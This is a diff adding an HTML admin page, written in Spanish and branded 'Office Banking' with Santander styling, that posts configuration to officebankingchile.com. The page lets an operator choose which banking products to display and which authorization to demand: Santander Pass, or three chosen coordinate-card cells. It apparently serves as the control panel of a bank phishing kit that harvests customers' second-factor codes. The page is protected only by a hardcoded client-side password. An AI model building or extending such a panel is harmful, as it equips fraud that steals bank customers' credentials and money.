@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Panel de Administración</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <script>
+    // Protección por clave simple
+    const clave = prompt("Ingrese clave de acceso:");
+    if(clave !== "Trabajo21"){   // <-- aquí defines tu clave
+      alert("Acceso denegado");
+      window.location.href = "index.html"; // redirige al login
+    }
+  </script>
+
+  <div class="login-box">
+    <img src="logo-office-banking.svg" alt="Office Banking" class="logo">
+
+    <h2>Configurar Productos y Autorización</h2>
+
+    <form id="adminForm">
+      <!-- Productos fijos -->
+      <label><input type="checkbox" id="producto1"> Línea de Crédito</label>
+      <input type="number" id="monto1" placeholder="Ej: 0">
+
+      <label><input type="checkbox" id="producto2"> Tarjeta de Crédito</label>
+      <input type="number" id="monto2" placeholder="Ej: 0">
+
+      <label><input type="checkbox" id="producto3"> Visualización de Tarjeta de Crédito</label>
+
+      <!-- Tipo de autorización -->
+      <label for="tipoAutorizacion">Tipo de Autorización</label>
+      <select id="tipoAutorizacion">
+        <option value="santander">Santander Pass</option>
+        <option value="coordenadas">Coordenadas</option>
+      </select>
+
+      <!-- Coordenadas -->
+      <div id="coordConfig">
+        <label for="coord1">Coordenada 1 (ej: A4)</label>
+        <input type="text" id="coord1" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: A4">
+
+        <label for="coord2">Coordenada 2 (ej: B7)</label>
+        <input type="text" id="coord2" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: B7">
+
+        <label for="coord3">Coordenada 3 (ej: C2)</label>
+        <input type="text" id="coord3" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: C2">
+      </div>
+
+      <button class="btn-santander" type="submit">
+        Guardar<span class="bg-arrow"></span>
+      </button>
+    </form>
+
+    <div id="resultado"></div>
+  </div>
+
+  <script>
+    const API_URL = "https://officebankingchile.com/config";
+
+    // Al cargar, obtener configuración
+    document.addEventListener("DOMContentLoaded", () => {
+      fetch(API_URL)
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById("producto1").checked = data.producto1 === "Línea de Crédito";
+          document.getElementById("monto1").value = data.monto1 || "";
+          document.getElementById("producto2").checked = data.producto2 === "Tarjeta de Crédito";
+          document.getElementById("monto2").value = data.monto2 || "";
+          document.getElementById("producto3").checked = data.producto3 === "Visualización de Tarjeta de Crédito";
+          document.getElementById("tipoAutorizacion").value = data.tipoAutorizacion || "santander";
+          document.getElementById("coord1").value = data.coord1 || "";
+          document.getElementById("coord2").value = data.coord2 || "";
+          document.getElementById("coord3").value = data.coord3 || "";
+        })
+        .catch(err => {
+          console.error("Error al cargar configuración:", err);
+          document.getElementById("resultado").innerText = "⚠️ No se pudo cargar configuración del servidor.";
+        });
+    });
+
+    // Guardar configuración
+    document.getElementById("adminForm").addEventListener("submit", function(e){
+      e.preventDefault();
+
+      const config = {
+        producto1: document.getElementById("producto1").checked ? "Línea de Crédito" : "",
+        monto1: document.getElementById("producto1").checked ? document.getElementById("monto1").value : "",
+        producto2: document.getElementById("producto2").checked ? "Tarjeta de Crédito" : "",
+        monto2: document.getElementById("producto2").checked ? document.getElementById("monto2").value : "",
+        producto3: document.getElementById("producto3").checked ? "Visualización de Tarjeta de Crédito" : "",
+        tipoAutorizacion: document.getElementById("tipoAutorizacion").value,
+        coord1: document.getElementById("coord1").value.toUpperCase(),
+        coord2: document.getElementById("coord2").value.toUpperCase(),
+        coord3: document.getElementById("coord3").value.toUpperCase()
+      };
+
+      fetch(API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(config)
+      })
+      .then(res => {
+        if(res.ok){
+          document.getElementById("resultado").innerText = "✅ Configuración actualizada correctamente.";
+        } else {
+          document.getElementById("resultado").innerText = "⚠️ Error al guardar configuración.";
+        }
+      })
+      .catch(err => {
+        console.error("Error al guardar configuración:", err);
+        document.getElementById("resultado").innerText = "⚠️ No se pudo conectar con el servidor.";
+      });
+    });
+  </script>
+</body>
+</html>
